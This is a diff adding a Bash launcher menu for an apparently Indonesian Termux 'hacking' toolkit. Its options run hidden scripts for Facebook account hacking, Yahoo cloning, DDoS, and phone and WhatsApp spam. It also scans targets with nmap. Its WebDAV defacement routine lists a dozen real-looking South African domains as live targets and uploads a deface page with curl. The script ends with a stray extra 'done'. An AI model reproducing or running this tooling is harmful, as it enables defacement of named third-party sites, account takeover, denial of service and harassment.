@@ -1,0 +1,163 @@
+clear
+blue='\e[1;34m'
+green='\e[0;23m'
+purple='\e[1;35m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+echo
+echo
+python2 .password.py
+echo -e $purple "               ___   ___   _  _   "
+echo -e $cyan "               | __| | _ ) | || |  *AsecC|~|eror404"
+echo -e $cyan "               | _|  | _ \ | __ |  "
+echo -e $blue "              _|_|_  |___/ |_||_|  "
+echo -e $red '        |"""""|| """ |HaxID|"""""||"""""| '
+echo -e $cyan "            *-0-0-***-0-0-***-0-0-*   "
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo -e $red "[!]KELUAR"
+sleep 1
+exit
+}
+lagi=1
+while [ $lagi -lt 14 ];
+do
+echo
+echo
+echo -e $red
+read -p "FBH ==>" pil;
+case $pil in
+help)
+clear
+echo""
+echo -e $purple "               ___   ___   _  _   "
+echo -e $cyan "               | __| | _ ) | || |  *AsecC|~|eror404"
+echo -e $cyan "               | _|  | _ \ | __ |  "
+echo -e $blue "              _|_|_  |___/ |_||_|  "
+echo -e $red '        |"""""|| """ |HaxID|"""""||"""""| '
+echo -e $cyan "            *-0-0-***-0-0-***-0-0-*   "
+echo ""
+echo -e $red "   *Commmend*          *Info*"
+echo ""
+echo -e $purple "     FBH_t           =$cyan""Hack FB target"
+echo -e $purple "     FBH_r           =$cyan""Hack FB rombongan"
+echo -e $purple "     FBH_b           =$cyan""Facebook Bot (sedang di perbaiki)"
+echo -e $purple "     FBH_c           =$cyan""Cloning Yahoo"
+echo -e $purple "     FBH_w           =$cyan""Buat Script Deface"
+echo -e $purple "     FBH_n           =$cyan""Scan Web"
+echo -e $purple "     FBH_d           =$cyan""Deface webdav"
+echo -e $purple "     FBH_o           =$cyan""DDOS Attack"
+echo -e $purple "     FBH_p           =$cyan""Spam Telpon"
+echo -e $purple "     FBH_m           =$cyan""Spam WA"
+echo -e $purple "     FBH_x           =$cyan""Ubah Tampilan Termux"
+echo ""
+echo -e $cyan "     exit            =$red""Keluar dari Program"
+;;
+FBH_t)
+clear
+python .FBHtarget.py
+;;
+FBH_r)
+clear
+python2 .FBHrombongan.py
+;;
+FBH_n)
+clear
+echo -e $purple "               ___   ___   _  _   "
+echo -e $cyan "               | __| | _ ) | || |  *AsecC|~|eror404"
+echo -e $cyan "               | _|  | _ \ | __ |  "
+echo -e $blue "              _|_|_  |___/ |_||_|  "
+echo -e $red '        |"""""|| """ |HaxID|"""""||"""""| '
+echo -e $cyan "            *-0-0-***-0-0-***-0-0-*   "
+echo ""
+echo -e $cyan "Masukan Web Target:"
+read web
+nmap -v -A $web
+;;
+FBH_d)
+clear
+echo -e $purple "               ___   ___   _  _   "
+echo -e $cyan "               | __| | _ ) | || |  *AsecC|~|eror404"
+echo -e $cyan "               | _|  | _ \ | __ |  "
+echo -e $blue "              _|_|_  |___/ |_||_|  "
+echo -e $red '        |"""""|| """ |HaxID|"""""||"""""| '
+echo -e $cyan "            *-0-0-***-0-0-***-0-0-*   "
+echo ""
+echo -e $blue "++++++++++++++Live Target++++++++++++++++++ "
+echo -e $red "####################################"
+echo -e $cyan " ® bitsandpieces.co.za"
+echo -e $cyan " ® cblandscapes.co.za"
+echo -e $cyan " ® windmillsandporcupines.co.za"
+echo -e $cyan " ® http://scnc.co.za"
+echo -e $cyan " ® http://contsol.co.za"
+echo -e $cyan " ® http://consultec.co.za"
+echo -e $cyan " ® http://colourfactory.co.za"
+echo -e $cyan " ® http://ayk.co.za"
+echo -e $cyan " ® http://daretogowildafrica.co.za"
+echo -e $cyan " ® http://floralandfresh.co.za"
+echo -e $cyan " ® http://foodconsult.co.za"
+echo -e $cyan " ® http://itsengineering.co.za"
+echo -e $red "#####################################"
+echo -e $blue "++++++++++++++++ThankS++++++++++++++++++++++"
+echo
+sleep 1
+echo -e $cyan "${y} [?]Masukan Script Deface [ script simpan di penyimpanan internal, ex:index.html ]:"
+read sc
+echo -e $purple "${y} [?]Masukan Web TarGet"
+read web
+echo -e $cyan " [*]Loading...."
+sleep 3
+echo -e $blue " [*]sedang memuat.."
+sleep 3
+echo -e $green " [*]Tunggu sebentar.."
+sleep 3
+curl -T /sdcard/$sc $web
+echo -e $cyan " [*]Selesai..."
+sleep 2
+echo -e $red "${y} [√]Hasil=" $web/$sc
+sleep 5
+;;
+FBH_w)
+clear
+sh .create.sh
+;;
+FBH_o)
+clear
+python2 .ddos.py
+;;
+FBH_p)
+clear
+php .call.php
+;;
+FBH_m)
+clear
+php .wa.php
+;;
+FBH_x)
+clear
+bash .ggmux.sh
+;;
+FBH_u)
+clear
+bash .upgrade.sh
+;;
+FBH_b)
+clear
+python2 .Bot.py
+;;
+FBH_c)
+clear
+python2 .cloning.py
+;;
+exit) echo -e $red " [!]KELUAR"
+sleep 1
+echo -e $cyan " [√]Terima Kasih"
+sleep 1
+exit
+;;
+*) echo -e $red " [!]ketik (help) untuk informasi lengkapnya!!! "
+sleep 2
+esac
+done
+done
